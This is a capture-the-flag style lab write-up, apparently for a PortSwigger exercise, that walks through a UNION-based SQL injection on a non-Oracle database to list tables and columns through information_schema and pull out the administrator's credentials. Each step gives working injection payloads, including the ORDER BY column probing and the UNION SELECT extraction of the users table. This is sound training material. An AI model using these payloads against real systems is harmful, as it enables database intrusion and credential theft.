# 🧠 Lab Title: SQL Injection Attack, Listing the Database Contents on Non-Oracle Databases
## 🔍 Category
SQLI
## 🎯 Objective
> Log in as the administrator user.

## 🧰 Tools Used
- Notepad , Burpsuite

## 🚀 Exploitation Steps
#### Observe the Description
From the lab description, we know that the database is not Oracle.  
**What does this mean?** It means that the payloads we will use will not be Oracle-based, like this: `SELECT banner FROM v$version`.  
Instead, the payloads will be for MySQL, Microsoft SQL Server, or PostgreSQL. Fortunately, we have this [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

Someone might ask, **How do we retrieve the admin password?**  
Good question! Since it’s not an Oracle database, we have to use `information_schema.tables` and `information_schema.columns`.  
**What is information_schema?**  
It’s a standard schema in relational database management systems (in contrast to non-relational databases like NoSQL) that provides metadata about each database. It acts as a catalog mapping metadata about tables, views, stored procedures, columns, constraints, and other database objects. I suggest looking at this [article](https://database.guide/understanding-information_schema-in-sql/) for more details.

#### Access the Lab
> Click on `ACCESS THE LAB`

#### START HACKING!!!
1) First, capture the request. We know that the vulnerability is in the product category, so capture that request first.

2) Let's determine the number of columns to perform a UNION-based attack.  
We try:  
```sql
' ORDER BY 1--
```  
It returns true, so we continue:  
```sql
' ORDER BY 2--
```  
Still good, so continue:  
```sql
' ORDER BY 3--
```  
We get an internal server error, which means there are only 2 columns.

3) From the cheat sheet, to retrieve database info from information_schema we use:  
```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns
``` 
So the payload will be:  
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```  
`table_name` is a placeholder to retrieve all table names.

4) We found a user table by searching for "users" with CTRL+F, so the payload will look like this:  
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_wzbtjt'--
```

5) We found password and username columns, so let's retrieve them:  
```sql
' UNION SELECT username_uwunbl, password_fxvjqe FROM users_wzbtjt--
```  
And BOOM! We got the password. Let's log in and solve the lab.

## 🧵 Reflection
> What is information_schema?  
> How do you retrieve data from a non-Oracle database?

